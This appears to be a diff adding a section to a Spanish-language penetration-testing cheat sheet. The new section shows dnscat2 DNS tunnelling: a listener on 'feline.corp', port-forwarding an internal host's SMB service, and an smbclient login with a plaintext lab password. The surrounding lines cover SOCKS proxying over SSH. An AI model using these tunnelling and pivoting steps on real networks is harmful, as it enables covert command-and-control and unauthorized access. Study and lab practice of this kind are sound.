@@ -436,6 +436,32 @@ proxychains
 
     ssh -o ProxyCommand='ncat --proxy-type socks5 --proxy 127.0.0.1:1080 %h %p' database_admin@10.4.50.215
 
+dnscat2
+
+  Abrimos listener:
+
+    dnscat2-server feline.corp
+
+  Nos conectamos a él:
+
+    ./dnscat feline.corp
+
+  Listamos ventanas activas:
+
+    windows
+
+  Nos conectamos a la que necesitemos:
+
+    window -i 1
+
+  Ejecutamos listener. En este caso, el servidor smb (puerto 445) del servidor 172.16.2.11 se tuneliza al puerto 4455 de nuestro local.
+
+    listen 127.0.0.1:4455 172.16.2.11:445
+
+  Una vez en escucha, podemos acceder desde nuestro local al puerto remoto:
+
+    smbclient -p 4455 -L //127.0.0.1 -U hr_admin --password=Welcome1234
+
 ## Vulnerabilidades conocidas
 
 Apache HTTP Server 2.4.49 - Path traversal
